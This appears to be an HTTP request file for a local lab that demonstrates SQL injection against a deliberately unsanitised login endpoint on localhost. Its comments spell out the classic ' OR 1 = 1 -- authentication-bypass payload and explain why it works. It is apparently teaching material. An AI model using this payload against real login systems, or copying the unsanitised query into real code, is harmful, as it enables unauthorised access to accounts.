### This is a wild guess for an account

POST http://127.0.0.1:5000/login
Content-Type: application/json

< invalid.json

### This is an account we know (to compare the response with our injected one)

POST http://127.0.0.1:5000/login
Content-Type: application/json

< login.json

### We will try to bypass the authentication "logic" here.
### If you examine the code, you will see that there's no input sanitation
### so `WHERE username='user' AND password = 'password'` becomes
###    `WHERE username='' OR 1 = 1 -- AND password = ''
### the reason it will pass is because it will look for a user with a
### username of empty string, or if 1 equals 1, which is always true,
### and the -- means the rest of the statement will be commented out (=ignored)

POST http://127.0.0.1:5000/login
Content-Type: application/json

< injection.json

###
